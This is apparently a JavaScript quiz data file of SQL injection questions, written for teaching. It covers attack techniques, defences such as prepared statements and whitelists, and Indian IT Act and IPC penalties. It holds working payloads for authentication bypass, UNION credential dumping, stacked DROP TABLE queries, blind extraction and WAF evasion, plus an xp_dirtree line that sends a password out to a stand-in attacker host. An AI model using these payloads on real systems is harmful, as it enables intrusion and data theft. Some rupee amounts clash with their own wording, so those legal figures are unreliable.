const questions = [
  {
    question: "What is SQL Injection (SQLi), and how does an Attacker manipulate the Structure of an SQL Query?",
    shortAnswer: "A security vulnerability where untrusted user input is directly concatenated into an SQL statement, allowing attackers to inject SQL metacharacters (quotes, comments, boolean operators) that alter the query's Abstract Syntax Tree (AST) to bypass authentication or extract data.",
    explanation: "When a developer writes `\"SELECT * FROM users WHERE username = '\" + input + \"'\"`, the single quote `'` is expected to close the string literal. An attacker submits `admin' OR '1'='1`. The query becomes `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`. The database evaluates `'1'='1'` as true for every row, returning all user records.",
    hint: "Using quotation marks and logic operators to change how the database reads and runs an SQL query.",
    level: "basic",
    codeExample: `// Fundamental SQL Injection Mechanism:
// Developer's Intention : Verify password for a specific username
// Vulnerable Query      : SELECT * FROM accounts WHERE user = 'USER_INPUT' AND pass = 'PASS_INPUT';
// Attacker Input        : user = admin'--  |  pass = ignored
// Resulting SQL Query   : SELECT * FROM accounts WHERE user = 'admin'--' AND pass = 'ignored';
// Consequence           : Comment character (--) drops password check! Logs in as admin!`
  },
  {
    question: "What is the Difference between 'String Literal Context' and 'Numeric Context' SQL Injection?",
    shortAnswer: "In String Literal Context, the injection occurs inside quotation marks (`WHERE name = '...'`) requiring the attacker to first break out using a single quote (`'`); in Numeric Context (`WHERE id = ...`), no quotes exist, allowing direct injection of SQL operators (`UNION`, `OR`) without quotes.",
    explanation: "Numeric context injection is often more dangerous because developers mistakenly assume numeric fields do not need escaping. If a route does `\"SELECT * FROM products WHERE id = \" + req.query.id`, an attacker passes `id = 1 UNION SELECT username, password FROM users`. The database executes the UNION query directly without needing quotes.",
    hint: "String context needs a single quote to break out of text, while numeric context has no quotes and executes SQL commands directly.",
    level: "moderate",
    codeExample: `// Context Comparison:
// 1. String Literal Context: SELECT * FROM users WHERE username = 'admin' OR '1'='1'; (Requires ' breakout)
// 2. Numeric Context       : SELECT * FROM items WHERE id = 105 OR 1=1; (No quote breakout needed!)`
  },
  {
    question: "How do Comment Characters (`--`, `/* */`, `#`) Function in SQL Injection Payloads across Different Database Dialects?",
    shortAnswer: "Comment characters instruct the SQL parser to ignore the remainder of the query string, allowing attackers to truncate trailing developer-written conditions (such as password checks or tenant filters).",
    explanation: "In standard ANSI SQL (PostgreSQL, Oracle, SQLite, MSSQL), `--` comments out the rest of the line (requires a trailing space in MySQL: `-- `). MySQL also supports `#`. Inline block comments `/* ... */` can be used within queries or to bypass simple space filters (`SELECT/**/username/**/FROM/**/users`).",
    hint: "Symbols that tell the database to ignore the rest of the original query written by the programmer.",
    level: "moderate",
    codeExample: `// Dialect-Specific Comment Syntax:
// PostgreSQL / Oracle / SQLite : admin'--
// MySQL / MariaDB              : admin'#  OR  admin'-- 
// Inline Filter Bypass         : SELECT/**/password/**/FROM/**/users;`
  },
  {
    question: "Why does the Tautology Payload `' OR 1=1--` consistently bypass SQL Authentication across RDBMS Systems?",
    shortAnswer: "Because `1=1` is a mathematical identity that always evaluates to TRUE; combined with the `OR` logical operator, the entire `WHERE` clause evaluates to TRUE for all rows, returning the first record in the table (typically the administrator).",
    explanation: "In relational logic: $\\text{False} \\lor \\text{True} \\equiv \\text{True}$. In `SELECT * FROM users WHERE user = 'wrong' OR 1=1--`, even though the username is incorrect, the `OR 1=1` condition forces the row filter to evaluate as TRUE for every user row. The database returns the user table, and the application logs in as the first record (User ID 1 = Administrator).",
    hint: "An equation that is always true (like 1=1) combined with OR makes the whole check succeed automatically.",
    level: "basic",
    codeExample: `// Boolean Truth-Table Evaluation:
// Condition 1: username == 'attacker' (FALSE)
// Condition 2: 1 == 1                 (TRUE)
// Evaluation : FALSE OR TRUE          ➔ TRUE (Authentication check bypassed!)`
  },
  {
    question: "Under the Indian Information Technology Act 2000 Section 66F, what constitutes the criminal penalty for executing SQL Injection attacks against Protected Critical Infrastructure?",
    shortAnswer: "Executing SQL injection to alter, damage, or extract data from critical national information infrastructure (power grids, nuclear systems, defense) to threaten national security is CYBER TERRORISM, punishable with IMPRISONMENT FOR LIFE.",
    explanation: "Section 66F of the IT Act defines Cyber Terrorism. If an adversary executes an SQL injection against state power grid databases in Barrackpore or national banking settlement switches in Salt Lake, the offense carries mandatory Life Imprisonment.",
    hint: "Section 66F prescribes Life Imprisonment for Cyber Terrorism attacks on critical infrastructure.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 66F - Cyber Terrorism):
// Offense: Executing SQL injection to delete substation telemetry records on 220kV power transmission grids
// Penalty: IMPRISONMENT FOR LIFE`
  },
  {
    question: "What is 'Identifier / Column Context' SQL Injection (e.g. `ORDER BY` and `GROUP BY` Injections)?",
    shortAnswer: "Injection occurring in SQL clauses that define column names or sort orders (`ORDER BY`, `GROUP BY`) where standard prepared statement parameter placeholders (`?`) cannot be used, requiring strict programmatic whitelisting.",
    explanation: "Standard prepared statements only parameterize *data values*, not column identifiers: `SELECT * FROM users ORDER BY ?` fails or treats the placeholder as a literal string. If a developer uses string concatenation: `\"... ORDER BY \" + sortColumn`, an attacker submits `(CASE WHEN (SELECT ascii(substr(password,1,1)) FROM users WHERE id=1)=97 THEN id ELSE name END)`. The developer must use a strict whitelist (`allowedColumns = ['name', 'date', 'price']`).",
    hint: "When user input controls how a table is sorted, where normal prepared statements cannot be used.",
    level: "expert",
    codeExample: `// Vulnerable ORDER BY Dynamic Concatenation:
const sort = req.query.sort; // Attacker inputs: "(SELECT CASE WHEN (1=1) THEN id ELSE price END)"
db.query("SELECT * FROM products ORDER BY " + sort);

// Secure Whitelist Implementation:
const ALLOWED_SORT = { "price_asc": "price ASC", "price_desc": "price DESC", "date": "created_at DESC" };
const safeSort = ALLOWED_SORT[req.query.sort] || "created_at DESC";
db.query("SELECT * FROM products ORDER BY " + safeSort);`
  },
  {
    question: "How do Attackers Fingerprint the Backend Database Engine (MySQL, PostgreSQL, MSSQL, Oracle) using SQL Dialects?",
    shortAnswer: "By evaluating dialect-specific string concatenation operators, built-in version functions, and sleep commands (e.g. `VERSION()` for MySQL/PostgreSQL vs `@@VERSION` for MSSQL vs `BANNER FROM v$version` for Oracle).",
    explanation: "Different database management systems implement different SQL extensions: 1. String Concatenation: MySQL uses `CONCAT('a','b')`, Oracle/Postgres/SQLite uses `'a'||'b'`, MSSQL uses `'a'+'b'`. 2. System Version: MySQL uses `SELECT VERSION()`, MSSQL uses `SELECT @@VERSION`, PostgreSQL uses `SELECT version()`. 3. System Time Delay: MySQL uses `SLEEP(5)`, PostgreSQL uses `pg_sleep(5)`, MSSQL uses `WAITFOR DELAY '0:0:5'`. Attackers test these expressions to identify the underlying database engine.",
    hint: "Testing unique functions like pg_sleep() or @@VERSION to figure out whether the server runs MySQL, Oracle, or SQL Server.",
    level: "expert",
    codeExample: `// Database Fingerprinting Matrix:
// MySQL / MariaDB  : ' OR CONCAT('a','b')='ab' # | SELECT VERSION(); | SLEEP(5);
// PostgreSQL       : ' OR 'a'||'b'='ab'--        | SELECT version(); | pg_sleep(5);
// Microsoft SQL    : ' OR 'a'+'b'='ab'--        | SELECT @@VERSION; | WAITFOR DELAY '0:0:5';
// Oracle Database  : ' OR 'a'||'b'='ab'--        | SELECT banner FROM v$version;`
  },
  {
    question: "Under the Digital Personal Data Protection (DPDP) Act 2023 Section 8(5) and Section 33, what are the enterprise liabilities if an SQL Injection breach leaks citizen personal data?",
    shortAnswer: "Failing to implement reasonable technical safeguards (such as parameterized queries) resulting in personal data exfiltration triggers statutory penalties up to ₹250 Crores by the Data Protection Board of India.",
    explanation: "Section 8(5) mandates that data fiduciaries must implement reasonable technical and organizational safeguards. If an enterprise in Kolkata fails to use prepared statements, resulting in a citizen database leak via SQL injection, Section 33 prescribes fines up to ₹250 Crores.",
    hint: "Maintaining continuous technical safeguards against SQL injection data leaks is mandatory under the DPDP Act.",
    level: "moderate",
    codeExample: `// DPDP Statutory Compliance Standard:
// Legal Section: Section 8(5) & Section 33 DPDP Act 2023
// Maximum Penalty: Up to ₹250,00,00,000 (Rupees 250 Crores) for negligent SQL injection vulnerabilities`
  },
  {
    question: "What is 'Stacked Queries SQL Injection' (Piggybacked Queries)?",
    shortAnswer: "An injection technique where an attacker terminates the original SQL statement with a semicolon (`;`) and appends an entirely new, independent SQL command (such as `DROP TABLE`, `INSERT`, or `UPDATE`), executing multiple commands in a single database round-trip.",
    explanation: "Supported in PostgreSQL, Microsoft SQL Server, and SQLite (and PHP `mysqli_multi_query`). If an application does `db.query(\"SELECT * FROM items WHERE id = \" + id)`, an attacker submits `105; DROP TABLE users;`. The database executes the select query first, and immediately executes the drop table query, permanently destroying user data.",
    hint: "Using a semicolon to stick a second completely independent SQL command onto the end of the first one.",
    level: "moderate",
    codeExample: `// Stacked Query Exploit:
// User Input: 105; UPDATE accounts SET balance = 1000000 WHERE user = 'attacker';--
// Executed SQL: SELECT * FROM items WHERE id = 105; UPDATE accounts SET balance = 1000000 WHERE user = 'attacker';--`
  },
  {
    question: "Under CERT-In Mandatory Directions 2022, what is the mandatory incident reporting timeline for SQL Injection data breaches?",
    shortAnswer: "All organizations in India must report security breaches and unauthorized database access resulting from SQL injection to CERT-In within 6 HOURS of detection.",
    explanation: "Under Section 70B of the IT Act and CERT-In Direction No. 20(3)/2022-CERT-In, service providers, intermediaries, data centers, and corporate bodies must mandatorily report specified cyber security incidents (including unauthorized access to database systems) to CERT-In within 6 hours of noticing them.",
    hint: "CERT-In requires mandatory incident reporting within a strict 6-hour window.",
    level: "basic",
    codeExample: `// Statutory SLA (CERT-In Mandatory Incident Reporting):
// Directive: Mandatory reporting of SQL injection database leaks within 6 HOURS
// Mandate: Section 70B Information Technology Act 2000`
  },
  {
    question: "What is 'INSERT / UPDATE Statement' SQL Injection?",
    shortAnswer: "Injection occurring in data modification statements; in `INSERT`, attackers inject extra column values to overwrite administrative flags; in `UPDATE`, attackers inject commas to overwrite other users' passwords or balances without a `WHERE` clause restriction.",
    explanation: "If a profile update query is: `\"UPDATE users SET bio = '\" + bio + \"' WHERE id = \" + user_id`, an attacker submits `bio = test', role = 'ADMIN' WHERE id = 1--`. The query becomes `UPDATE users SET bio = 'test', role = 'ADMIN' WHERE id = 1--' WHERE id = 5`. The user updates their own role to ADMIN or modifies another user's profile.",
    hint: "Injecting commas and column names into profile update forms to make yourself an administrator.",
    level: "moderate",
    codeExample: `// UPDATE Statement Injection Exploit:
// Injected Bio: Developer', role = 'SUPER_ADMIN'--
// Executed Query: UPDATE users SET bio = 'Developer', role = 'SUPER_ADMIN'--' WHERE id = 102;`
  },
  {
    question: "Under the Indian IT Act Section 43(a), what constitutes civil liability for extracting database records using SQL Injection?",
    shortAnswer: "Securing access and extracting or copying data from a computer system without permission of the owner carries compensation by way of damages up to ₹1 Crore.",
    explanation: "Section 43(a) explicitly penalizes unauthorized data extraction: 'If any person without permission of the owner... accesses or secures access to such computer... he shall be liable to pay damages by way of compensation not exceeding one crore rupees.'",
    hint: "Section 43(a) provides civil compensation up to ₹1 Crore for unauthorized data extraction.",
    level: "basic",
    codeExample: `// Statutory Liability (IT Act Section 43(a)):
// Violation: Using SQL injection to dump 20,000 patient diagnostic files from an Ichapur clinic
// Compensation: Up to ₹1,00,00,00,000 (Rupees One Crore) per affected entity`
  },
  {
    question: "What is 'Truncation / Space Exhaustion SQL Injection' in Fixed-Length Database Fields?",
    shortAnswer: "An attack exploiting databases that silently truncate strings exceeding column length limits (e.g. `VARCHAR(20)`); an attacker registers `admin           x` (with 20 spaces); the database truncates `x` and stores `admin`, allowing the attacker to reset the real administrator's password.",
    explanation: "If `username` is defined as `VARCHAR(16)`, an attacker creates an account with username `admin           1`. The database silently truncates the string to 16 characters (`admin           `), which compares equal to `admin` in MySQL trailing space comparisons. When the attacker initiates a password reset for `admin           `, the system resets the real `admin` password.",
    hint: "Padding a username with lots of spaces so the database cuts off the end and thinks you are the real admin.",
    level: "expert",
    codeExample: `// MySQL String Truncation Behavior:
// Column Definition: username VARCHAR(10)
// Registered Input  : 'admin     x' (Truncated to 'admin     ')
// MySQL Comparison  : ('admin     ' = 'admin') ➔ TRUE (Trailing spaces ignored!)`
  },
  {
    question: "What is 'WAF SQLi Signature Bypassing' using Character Encodings, Inline Comments, and Alternate Case?",
    shortAnswer: "Techniques used by adversaries to evade Web Application Firewall (WAF) regex signatures by using URL encoding (`%27`), hex encoding (`0x61646d696e`), inline SQL comments (`UN/**/ION`), or alternate capitalization (`uNiOn sElEcT`).",
    explanation: "Naively written WAFs check for exact strings like `UNION SELECT` or single quotes. Attackers bypass these rules: 1. Case Variation: `uNiOn SeLeCt`. 2. Inline Comments: `UNION/**/ALL/**/SELECT`. 3. Hex Constants: `0x61646d696e` (represents 'admin' in MySQL without quotes). 4. Multi-byte URL Encoding: `%bf%27` (GBK double-byte quote bypass). This proves why WAFs alone are insufficient and backend Prepared Statements are mandatory.",
    hint: "Mixing upper and lower case letters or using comments like /**/ to trick firewalls while the database still runs the query.",
    level: "expert",
    codeExample: `// WAF Evasion Payload Variants:
// Standard Payload : ' UNION SELECT password FROM users--
// WAF Evasion 1    : '/**/uNiOn/**/sElEcT/**/password/**/fRoM/**/users--
// WAF Evasion 2    : ' UNION ALL SELECT UNHEX('70617373776f7264') FROM users--`
  },
  {
    question: "Under the Indian IT Act Section 66, what constitutes the criminal penalty for writing automated SQL Injection attack tools?",
    shortAnswer: "Dishonestly or fraudulently hacking or diminishing the utility of computer systems carries imprisonment up to 3 years and fines up to ₹5 Lakhs.",
    explanation: "Section 66 criminalizes fraudulent computer disruption: 'If any person, dishonestly or fraudulently, does any act referred to in section 43... he shall be punishable with imprisonment for a term which may extend to three years or with fine which may extend to five lakh rupees, or with both.'",
    hint: "Section 66 provides up to 3 years imprisonment and ₹5 Lakh fine for fraudulent computer hacking.",
    level: "basic",
    codeExample: `// Statutory Penalty (IT Act Section 66):
// Offense: Writing and executing automated SQLi scripts against Kolkata municipal portals
// Penalty: Up to 3 Years Imprisonment + Fine up to ₹5,00,00,000`
  },
  {
    question: "What is 'SQL Injection in LIKE Clauses' and how do `%` and `_` Wildcard Characters cause Data Extraction?",
    shortAnswer: "When user input is placed inside `WHERE name LIKE '%` + input + `%'`, an attacker injects SQL single quotes or abuses the `%` (match any characters) and `_` (match single character) wildcards to leak data character-by-character.",
    explanation: "In SQL, `_` matches exactly 1 character and `%` matches 0 or more characters. If a search query is un-escaped, an attacker searches for `a%` to test if records begin with 'a'. Furthermore, if single quotes are not parameterized, an attacker injects `' OR (SELECT ... ) LIKE '%` to turn search filters into full inferential extraction channels.",
    hint: "Using the percent sign and underscore symbols in search boxes to guess passwords letter by letter.",
    level: "moderate",
    codeExample: `// LIKE Clause Parameterization (Node.js/MySQL):
// Vulnerable: db.query("SELECT * FROM users WHERE name LIKE '%" + search + "%'");
// Secure:     db.execute("SELECT * FROM users WHERE name LIKE ?", ['%' + search + '%']);`
  },
  {
    question: "Synthesize an enterprise-scale Multi-Tier SQL Injection Defense Architecture.",
    shortAnswer: "A defense-in-depth framework combining 100% Parameterized Prepared Statements, ORM Type-Safe Query Builders, Positive Schema Validation (Joi/Zod), Least Privilege Database Accounts (No DDL/xp_cmdshell), Cloud WAF Inspection (OWASP CRS), and Database Activity Monitoring (DAM).",
    explanation: "To achieve complete immunity against SQL injection across all contexts: 1. Application Layer: 100% Prepared Statements for all DML queries (`SELECT`, `INSERT`, `UPDATE`, `DELETE`) and strict whitelisting for identifiers (`ORDER BY`). 2. Schema Layer: Strong type enforcement (integers, UUIDs, strict regex strings). 3. Database Layer: Principle of Least Privilege (web app DB user cannot drop tables, access `information_schema`, or execute stored procedures). 4. Monitoring Layer: Database Activity Monitoring logging all query execution anomalies to SIEM.",
    hint: "Combine 100% Prepared Statements, identifier whitelisting, least privilege database accounts, and Database Activity Monitoring.",
    level: "expert",
    codeExample: `// Master Enterprise SQLi Defense Blueprint:
// 1. Schema Tier   : Joi / Zod Positive Type Validation (Reject non-primitive objects)
// 2. Query Tier    : 100% Parameterized Prepared Statements (Zero String Concatenation!)
// 3. Identifier    : Strict Whitelist Arrays for Dynamic ORDER BY / GROUP BY
// 4. DB Privilege  : REVOKE ALL PRIVILEGES ON *.* FROM 'webapp_user'@'%';
//                    GRANT SELECT, INSERT, UPDATE, DELETE ON app_db.* TO 'webapp_user'@'10.0.0.%';
// 5. Monitoring    : Real-Time Database Activity Monitoring (DAM) with SIEM Alerting`
  },
  {
    question: "What is 'Database Connection String Injection' in Dynamic Multi-Tenant Applications?",
    shortAnswer: "When untrusted user input is concatenated into database connection strings (`Driver=...;Server=` + input), allowing attackers to inject parameters like `Data Source=` or specify rogue database servers to capture credentials.",
    explanation: "In multi-tenant SaaS architectures where tenants specify database hosts: `connectionString = \"Server=\" + tenantHost + \";User=sa;Password=secret\"`. An attacker passes `tenantHost = \"10.0.0.1;Database=malicious;\"`, altering the connection target or directing traffic to an attacker-controlled rogue SQL server to capture the master database password.",
    hint: "Injecting parameters into the database connection URL to connect to a hacker's database instead.",
    level: "expert",
    codeExample: `// Connection String Injection Vulnerability:
// Injected Host: 103.25.10.1;Integrated Security=SSPI;Initial Catalog=master;
// Result: Connection string properties overridden, switching database context!`
  },
  {
    question: "Under the Indian Penal Code Section 427, what constitutes 'Mischief' via SQL Injection Deletions?",
    shortAnswer: "Intentionally causing damage or destruction to digital property (such as executing `DROP TABLE` or `DELETE FROM` via SQL injection), punishable with imprisonment up to 2 years and fines.",
    explanation: "Section 425/427 IPC defines Mischief. When an attacker executes `DROP TABLE accounts;` or destroys medical records in West Bengal using SQL injection, the act destroys electronic property utility, punishable with up to 2 years imprisonment under Section 427.",
    hint: "IPC Section 427 covers Mischief and Digital Property Destruction with up to 2 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Penalty (Indian Penal Code Section 427):
// Offense: Executing SQL injection to delete patient billing tables in a Kolkata hospital (Mischief)
// Penalty: Imprisonment for a term up to 2 Years, or with Fine, or with both`
  },
  {
    question: "What is 'Second-Order SQL Injection' in Password Reset Workflows?",
    shortAnswer: "When an attacker registers with username `admin'--`, safely stored via prepared statements in Step 1, but later retrieved and dynamically concatenated into an unsafe SQL query during a password reset or audit script in Step 2, resetting the real administrator's password.",
    explanation: "In Phase 1, user registers `name = admin'--`. The app safely inserts it. In Phase 2, an admin runs a password reset tool: `db.query(\"UPDATE users SET pass = 'new' WHERE name = '\" + user.name + \"'\")`. The query evaluates as `UPDATE users SET pass = 'new' WHERE name = 'admin'--'`, changing the real admin's password.",
    hint: "Planting a single quote in your username during registration so it breaks a completely different database query days later.",
    level: "expert",
    codeExample: `// Second-Order SQLi Flow:
// Step 1: Register username: "admin'--" (Safely stored in database via Prepared Statement)
// Step 2: Password reset script runs: query("UPDATE users SET pass = '123' WHERE user = '" + username + "'")
// Result: Real administrator's password is reset to '123'!`
  },
  {
    question: "What is 'SQL Injection in JSON Query Fields' (PostgreSQL `->` and MySQL `JSON_EXTRACT`)?",
    shortAnswer: "Injection occurring when user input is dynamically concatenated into JSON document path operators (`data->>'` + key + `'`), allowing attackers to break out of JSON paths and execute arbitrary SQL commands inside modern RDBMS JSON stores.",
    explanation: "Modern relational databases support JSON querying: in PostgreSQL, `SELECT * FROM profiles WHERE metadata->>'department' = 'HR'`. If the JSON key is constructed dynamically: `\"... metadata->>'\" + key + \"'\"`, an attacker supplies `key = department' OR '1'='1`, breaking out of the JSON operator and altering the query logic.",
    hint: "Injecting SQL into modern JSON database search queries inside PostgreSQL or MySQL.",
    level: "expert",
    codeExample: `// PostgreSQL JSON Injection:
// Vulnerable: db.query("SELECT * FROM profiles WHERE metadata->>'" + key + "' = 'active'");
// Secure:     db.execute("SELECT * FROM profiles WHERE metadata->>? = 'active'", [key]);`
  },
  {
    question: "Under the Indian IT Act Section 70, what constitutes the penalty for executing SQL Injection attacks against 'Protected Systems'?",
    shortAnswer: "Securing unauthorized access or attempting to secure access to designated Protected Systems (critical infrastructure) carries imprisonment up to 10 YEARS and severe fines.",
    explanation: "Section 70 of the IT Act governs Critical Information Infrastructure (e.g. power grids in Barrackpore, financial settlement switches in Salt Lake). Launching an SQL injection attack against a designated protected system carries up to 10 years imprisonment under Section 70.",
    hint: "Section 70 carries up to 10 years imprisonment for unauthorized access to Protected Systems.",
    level: "basic",
    codeExample: `// Statutory Offense (IT Act Section 70):
// Offense: Executing SQL injection against the SCADA power grid management database
// Penalty: Imprisonment for a term up to 10 YEARS, and shall also be liable to Fine`
  },
  {
    question: "What is 'Blind Boolean SQL Injection' Working Principle?",
    shortAnswer: "An inferential technique used when the application does NOT display SQL error messages or query data; the attacker asks true/false questions (`AND 1=1` vs `AND 1=2`) and observes differences in HTTP status codes, page lengths, or response text to reconstruct data character-by-character.",
    explanation: "If the application responds with 'User Found' when the injected condition is true and 'User Not Found' when false, an attacker queries: `admin' AND (SELECT ascii(substr(password,1,1)) FROM users WHERE id=1) = 97--`. If 'User Found' appears, the first character of the password is 'a' (ASCII 97). The attacker iterates through all characters to extract the full password.",
    hint: "Playing a game of 20 Questions with the database where it only answers Yes or No.",
    level: "moderate",
    codeExample: `// Blind Boolean Inference:
// Request 1: /user?id=105 AND 1=1 ➔ Returns: "Profile Active" (TRUE)
// Request 2: /user?id=105 AND 1=2 ➔ Returns: "Profile Not Found" (FALSE)
// Request 3: /user?id=105 AND (SELECT ascii(substr(password,1,1)) FROM users WHERE id=1)=97 ➔ TRUE ➔ First char is 'a'!`
  },
  {
    question: "What is 'Time-Based Blind SQL Injection' Working Principle?",
    shortAnswer: "An inferential technique used when the application returns identical visual responses regardless of boolean truth; the attacker injects sleep commands (`SLEEP(5)` / `pg_sleep(5)`); if the server takes 5 seconds to respond, the condition is true, allowing data extraction via timing delays.",
    explanation: "If an application always displays a generic 'Thank you for your feedback' page, an attacker injects: `' OR (SELECT CASE WHEN (ascii(substr(password,1,1))=97) THEN pg_sleep(5) ELSE pg_sleep(0) END)--`. If the HTTP response arrives in 5.2 seconds, character 1 is 'a'. If it arrives in 0.2 seconds, character 1 is not 'a'.",
    hint: "Making the database freeze for 5 seconds when a guess is correct so you know the answer by checking your stopwatch.",
    level: "moderate",
    codeExample: `// Time-Based Inference:
// Condition True  ➔ Executes pg_sleep(5) ➔ HTTP Response Time = 5,230 ms (Character MATCH!)
// Condition False ➔ Executes pg_sleep(0) ➔ HTTP Response Time = 140 ms (No Match!)`
  },
  {
    question: "Under the Indian Penal Code Section 420, what constitutes Cheating via SQL Injection Authentication Bypass?",
    shortAnswer: "Dishonestly bypassing authentication or modifying financial records using SQL injection to obtain property or services, punishable with imprisonment up to 7 years and fines.",
    explanation: "Section 420 IPC penalizes cheating and fraudulent property transfer. If an attacker uses `' OR 1=1--` to log into a corporate bank account in West Bengal and transfers funds, they are prosecuted under Section 420 alongside the IT Act.",
    hint: "IPC Section 420 covers Cheating and Fraudulent Property Transfer with up to 7 years imprisonment.",
    level: "basic",
    codeExample: `// Statutory Offense (Indian Penal Code Section 420):
// Offense: Using SQL injection authentication bypass to transfer ₹50 Lakhs from a corporate account
// Penalty: Imprisonment for a term up to 7 Years, and shall also be liable to Fine`
  },
  {
    question: "What is 'UNION-Based SQL Injection' Working Principle?",
    shortAnswer: "An in-band technique where an attacker uses the `UNION` operator to append the results of their own injected `SELECT` query to the original query results, displaying confidential tables directly in the web application's HTML response.",
    explanation: "For a UNION query to succeed: 1. The injected query must return the EXACT same number of columns as the original query (determined via `ORDER BY 1, 2, 3...`). 2. The data types of corresponding columns must be compatible. If an app displays 3 product columns, an attacker injects `' UNION SELECT id, username, password FROM users--`, dumping user credentials directly into the product catalog view.",
    hint: "Stitching a second search query onto the original search query so the website displays hidden database tables.",
    level: "moderate",
    codeExample: `// UNION-Based Injection Flow:
// Step 1: Find Column Count ➔ ' ORDER BY 3-- (Succeeds), ' ORDER BY 4-- (Errors ➔ Exactly 3 Columns!)
// Step 2: Extract Data      ➔ ' UNION SELECT 1, username, password_hash FROM users--`
  },
  {
    question: "What is 'Error-Based SQL Injection' Working Principle?",
    shortAnswer: "An in-band technique where an attacker intentionally injects functions that trigger database runtime errors (e.g. `CAST()` overflow or `ExtractValue()` XML errors), forcing the database to embed confidential table data inside the verbose error message displayed on the page.",
    explanation: "In Microsoft SQL Server: `' AND 1=CAST((SELECT TOP 1 password FROM users) AS INT)--`. The database evaluates the subquery, fetches the string password (e.g. `Secret123`), attempts to convert it to an integer, fails, and throws an error: `Conversion failed when converting the varchar value 'Secret123' to data type int.` The password is leaked directly inside the error message.",
    hint: "Tricking the database into throwing an error message that contains the secret password inside the error text.",
    level: "expert",
    codeExample: `// MSSQL Error-Based Exploit:
// Injected Payload : ' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users))--
// Returned Error   : Conversion failed when converting the varchar value 'AdminPass2026!' to data type int.`
  },
  {
    question: "What is 'Out-of-Band' (OOB) SQL Injection Working Principle?",
    shortAnswer: "An inferential technique used when in-band output is disabled and time delays are throttled; the attacker forces the database to initiate external DNS or HTTP requests containing exfiltrated data to an attacker-controlled server (e.g. via `xp_dirtree` or `UTL_HTTP`).",
    explanation: "In Microsoft SQL Server, calling `EXEC master..xp_dirtree '\\\\'+(SELECT password FROM users)+'.attacker.in\\a'` forces the database server to perform a DNS lookup for `AdminPass2026.attacker.in`. The attacker's authoritative DNS server captures the query, extracting the password out-of-band even when the web application returns zero response data.",
    hint: "Forcing the database to make a phone call or DNS lookup to your own computer to send you the secret password.",
    level: "expert",
    codeExample: `// MSSQL DNS Exfiltration Payload:
'; DECLARE @data varchar(100); SELECT @data = password FROM users WHERE id=1;
   EXEC('master..xp_dirtree "\\\\'+@data+'.attacker.in\\a"');--`
  },
  {
    question: "Synthesize the mathematical formulation of Query Abstract Syntax Tree (AST) Mutation, Original Predicate (P_orig), Injected Predicate (P_inject), and Tautology Evaluation.",
    shortAnswer: "The evaluated AST filter predicate is P_eval = P_orig OR P_inject; when a tautology payload is injected (P_inject == True), P_eval = P_orig OR True === True for all rows in the relation, resulting in 100% authentication bypass and total record leakage.",
    explanation: "Let the relational table be represented as a set of tuples $T = \\{t_1, t_2, \\dots, t_N\\}$. In a legitimate query, the row filter is: $R = \\{t \\in T \\mid P_{\\text{orig}}(t) = \\text{True}\\}$. Under string concatenation, an attacker injects a tautology $P_{\\text{inject}} \\equiv \\top$. The evaluated filter predicate mutates to: $P_{\\text{eval}}(t) = P_{\\text{orig}}(t) \\lor \\top \\equiv \\top, \\quad \\forall t \\in T$. Therefore, the returned relation is $R = \\{t \\in T \\mid \\top\\} = T$ (the entire database table is returned). In Prepared Statements, the AST parser treats $P_{\\text{inject}}$ as a literal value parameter $v \\in \\Sigma^*$, keeping the AST node structure $P_{\\text{eval}}(t) = (t.\\text{user} = v)$ fixed, guaranteeing $P_{\\text{bypass}} = 0.00\\%$.",
    hint: "Mathematical proof formula showing that injecting a tautology (OR True) mutates the AST row filter so every row in the database evaluates to True.",
    level: "expert",
    codeExample: `// Query AST Mutation Mathematical Proof:
// Original Predicate : P_orig = (user == 'input' AND pass == 'pass')
// Injected Predicate : P_inject = (1 == 1)
// Mutated AST Filter : P_eval = (user == 'admin') OR (1 == 1) ➔ Evaluates TRUE for all N tuples in relation T!
// Result             : Complete Authentication Bypass (100% Data Return)!`
  }
];

export default questions;
